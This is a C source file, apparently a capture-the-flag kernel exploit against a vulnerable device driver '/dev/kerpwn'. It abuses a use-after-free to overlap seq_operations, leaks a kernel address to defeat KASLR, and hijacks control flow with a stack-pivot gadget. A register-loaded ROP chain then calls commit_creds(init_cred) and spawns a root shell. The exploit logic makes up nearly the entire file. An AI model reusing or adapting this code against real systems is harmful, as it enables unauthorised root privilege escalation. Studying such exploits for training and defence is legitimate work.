// size_t user_cs,user_ss,user_rflags,user_sp;
// void save_status(){
//    __asm__("mov user_cs,cs;"
//            "mov user_ss,ss;"
//            "mov user_sp,rsp;"
//            "pushf;"            //push eflags
//            "pop user_rflags;"
//           );
// }


// void spawn_shell(){
//    if(!getuid()){
//       system("/bin/sh");
//    }
//    else{
//       puts("[*]spawn shell error!");
//    }
//    exit(0);
// }


#include <fcntl.h>
#include <stddef.h>

// #define COMMIT_CREDS_OFFSET (0xffffffffb84c8d40 - 0xffffffffb8400000)
#define COMMIT_CREDS_OFFSET (0xFFFFFFFF8109A33C - 0xffffffff81000000)
// #define PREPARE_KERNEL_CRED (0xffffffffb84c91d0 - 0xffffffffb8400000)

#define INIT_CRED_OFFSET (0xffffffffb4463300 - 0xffffffffb2e00000)
// #define INIT_CRED_OFFSET (0xffffffff82663300  - 0xffffffff81000000)
#define POP_RDI_RET_OFFSET (0xffffffff81089250 - 0xffffffff81000000)
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE_OFFSET (0xffffffff81c00f30 - 0xffffffff81000000)

long dev_fd;


typedef struct op_chunk{
    size_t  idx;
    size_t  size;
    void    *buf;
} OP_CHUNK;


typedef struct alloc_chunk{
    size_t  size;
    void    *buf;
} ALLOC_CHUNK;


void readChunk(size_t idx, size_t size, void *buf){
    OP_CHUNK op = 
    {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x40, &op);
}


void writeChunk(size_t idx, size_t size, void *buf){
    OP_CHUNK op = 
    {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x50, &op);
}


void deleteChunk(size_t idx){
    OP_CHUNK op = 
    {
        .idx = idx,
    };
    ioctl(dev_fd, 0x30, &op);
}


void allocChunk(size_t size, void *buf){
    ALLOC_CHUNK alloc = 
    {
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x20, &alloc);
}


size_t  buf[0x100];
long    seq_fd;
size_t init_cred;
size_t pop_rdi_ret;
size_t commit_creds;
size_t swapgs_restore_regs_and_return_to_usermode;


int main(int argc, char ** argv, char ** envp){

    dev_fd = open("/dev/kerpwn", O_RDWR);
    if(dev_fd < 0){
        puts("[*]open /dev/kerpwn error!");
    }

    allocChunk(0x20, buf);
    deleteChunk(0);  // UAF
    seq_fd = open("/proc/self/stat", O_RDONLY);
    readChunk(0, 0x20, buf);

    printf("%x\n", buf[0]);
    // printf("%x\n", buf[1]);
    // printf("%x\n", buf[2]);
    // printf("%x\n", buf[3]);

    /*
        / # ./exp
        bc719d30
        bc719d70
        bc719d50
        bc793390
        / # cat /proc/kallsyms | grep "bc719d30"
        ffffffffbc719d30 t single_start
        / # cat /proc/kallsyms | grep "bc719d70"
        ffffffffbc719d70 t single_stop
    */

    int offset = 0xffffffffbc719d30 - 0xffffffffbc400000;
    int kernel_base = buf[0] + 0xffffffff00000000 - offset;

    printf("%x\n", kernel_base);


    /*
    .text:FFFFFFFF8135B0F6                 add     rsp, 180h
    .text:FFFFFFFF8135B0FD                 pop     rbx
    .text:FFFFFFFF8135B0FE                 pop     r12
    .text:FFFFFFFF8135B100                 pop     r13
    .text:FFFFFFFF8135B102                 pop     r14
    .text:FFFFFFFF8135B104                 pop     rbp
    .text:FFFFFFFF8135B105                 retn
    */
    size_t gadget = 0xffffffff8135b0f6 - 0xffffffff81000000 + kernel_base; // add rsp 一个数然后 pop 一堆寄存器最后ret
    buf[0] = gadget;
    printf("%x\n", gadget);
    writeChunk(0, 0x20, buf);

    // __asm__(
    //     "mov r15,   0xbeefdead;"
    //     "mov r14,   0x11111111;"
    //     "mov r13,   0x22222222;"
    //     "mov r12,   0x33333333;"
    //     "mov rbp,   0x44444444;"
    //     "mov rbx,   0x55555555;"
    //     "mov r11,   0x66666666;"
    //     "mov r10,   0x77777777;"
    //     "mov r9,    0x88888888;"
    //     "mov r8,    0x99999999;"
    //     "xor rax,   rax;"
    //     "mov rcx,   0xaaaaaaaa;"
    //     "mov rdx,   8;"
    //     "mov rsi,   rsp;"
    //     "mov rdi,   seq_fd;"        // 这里假定通过 seq_operations->stat 来触发
    //     "syscall"
    // );


    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE_OFFSET + kernel_base;
    init_cred = INIT_CRED_OFFSET + kernel_base;
    pop_rdi_ret = POP_RDI_RET_OFFSET + kernel_base;
    commit_creds = COMMIT_CREDS_OFFSET + kernel_base;


    swapgs_restore_regs_and_return_to_usermode += 9;

    __asm__(
        "mov r15, 0xbeefdead;"
        "mov r14, pop_rdi_ret;"
        "mov r13, init_cred;" // add rsp, 0x40 ; ret
        "mov r12, commit_creds;"
        "mov rbp, swapgs_restore_regs_and_return_to_usermode;"
        "mov rbx, 0x999999999;"
        "mov r11, 0x114514;"
        "mov r10, 0x666666666;"
        "mov r9, 0x1919114514;"
        "mov r8, 0xabcd1919810;"
        "xor rax, rax;"
        "mov rcx, 0x666666;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, seq_fd;"
        "syscall"
    );

    system("/bin/sh");

    return 0;
}